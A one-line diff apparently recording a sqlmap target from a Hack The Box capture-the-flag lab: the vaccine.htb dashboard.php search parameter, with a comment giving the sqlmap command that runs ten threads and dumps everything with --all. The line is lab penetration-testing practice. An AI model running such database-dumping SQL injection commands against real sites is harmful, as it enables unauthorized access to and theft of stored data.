@@ -1,0 +1,1 @@
+http://vaccine.htb:80/dashboard.php?search=* (GET)  # /usr/bin/sqlmap -r search_request.txt --threads=10 --all --output-dir=sqlmap_result
